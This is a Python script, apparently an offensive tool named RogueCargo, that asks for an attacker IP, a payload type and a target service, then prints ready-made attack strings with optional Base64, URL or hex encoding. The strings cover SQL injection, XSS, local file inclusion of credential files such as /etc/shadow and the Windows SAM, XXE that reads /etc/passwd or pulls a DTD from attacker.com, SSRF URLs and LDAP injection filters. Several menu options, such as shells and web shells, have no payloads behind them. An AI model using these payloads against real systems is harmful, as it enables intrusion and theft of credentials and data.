import argparse
import os
import json
import base64
import urllib.parse

def ask_question(question, options):
    print(f"\n{question}")
    for i, option in enumerate(options, 1):
        print(f"[{i}] {option}")
    
    choice = input("Select an option (number): ")
    while not choice.isdigit() or int(choice) not in range(1, len(options) + 1):
        choice = input("Invalid choice. Please select a valid option: ")
    
    return options[int(choice) - 1]

def encode_payload(payload):
    print("\n[+] Select encoding method:")
    encoding_method = ask_question("Choose an encoding technique:", ["None", "Base64", "URL Encoding", "Hex"])
    
    if encoding_method == "Base64":
        return base64.b64encode(payload.encode()).decode()
    elif encoding_method == "URL Encoding":
        return urllib.parse.quote(payload)
    elif encoding_method == "Hex":
        return payload.encode().hex()
    return payload

def suggest_payloads(payload_type, service, os_type, attacker_ip, custom_payloads):
    payloads = {
        "SQL Injection": {
            "MySQL": [
                "' OR '1'='1' --", 
                "admin' --", 
                "1' UNION SELECT null, username, password FROM users --",
                "1 AND SLEEP(5) --", 
                "1' AND 1=CAST((SELECT @@version) AS INT) --"
            ]
        },
        "XSS": {
            "JavaScript": [
                "<script>alert('XSS')</script>",
                "\"><script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(document.domain)>"
            ]
        },
        "LFI": {
            "Apache": [
                "../../../../etc/passwd", 
                "../../../../var/log/apache2/access.log", 
                "/proc/self/environ",
                "/etc/hosts",
                "/etc/group",
                "/etc/shadow",
                "/root/.bash_history",
                "/var/log/auth.log",
                "C:\\Windows\\win.ini",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "C:\\Windows\\repair\\sam",
                "C:\\Windows\\System32\\config\\SAM"
            ]
        },
        "XXE": {
            "XML": [
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/malicious.dtd\">]><foo>&xxe;</foo>"
            ]
        },
        "SSRF": {
            "Web": [
                f"http://{attacker_ip}:8080/admin",
                f"file:///etc/passwd"
            ]
        },
        "LDAP Injection": {
            "Active Directory": [
                "*)(|(cn=*))", 
                "*)(|(uid=*))(|(uid=admin))"
            ]
        }
    }
    
    # Merge custom payloads
    if payload_type in custom_payloads:
        if service in custom_payloads[payload_type]:
            payloads[payload_type][service].extend(custom_payloads[payload_type][service])
    
    print(f"\n[+] Suggested Payloads for {payload_type} on {service} (OS: {os_type}):")
    for payload in payloads.get(payload_type, {}).get(service, ["No payloads available"]):
        encoded_payload = encode_payload(payload)
        print(f"  - {encoded_payload}")

def load_custom_payloads():
    custom_payloads_file = "custom_payloads.json"
    if os.path.exists(custom_payloads_file):
        with open(custom_payloads_file, "r") as f:
            return json.load(f)
    return {}

def main():
    print("\n🔥 Welcome to RogueCargo - Your Payload Generator 🔥")
    
    attacker_ip = input("Enter your attacker IP (for reverse shells, etc.): ")
    
    payload_type = ask_question("What type of payload do you need?", ["SQL Injection", "XSS", "LFI", "XXE", "SSRF", "LDAP Injection", "Command Injection", "SSTI", "Shell", "Web Shells"])
    
    service_mapping = {
        "SQL Injection": ["MySQL"],
        "XSS": ["JavaScript"],
        "LFI": ["Apache"],
        "XXE": ["XML"],
        "SSRF": ["Web"],
        "LDAP Injection": ["Active Directory"],
        "Command Injection": ["Linux", "Windows"],
        "SSTI": ["Flask", "Jinja2"],
        "Shell": ["Linux", "Windows"],
        "Web Shells": ["PHP", "ASP", "JSP"]
    }
    
    service = ask_question(f"Which service or technology are you targeting?", service_mapping[payload_type])
    
    os_type = ask_question("What is the target operating system?", ["Linux", "Windows", "Unknown"])
    
    custom_payloads = load_custom_payloads()
    suggest_payloads(payload_type, service, os_type, attacker_ip, custom_payloads)

if __name__ == "__main__":
    main()
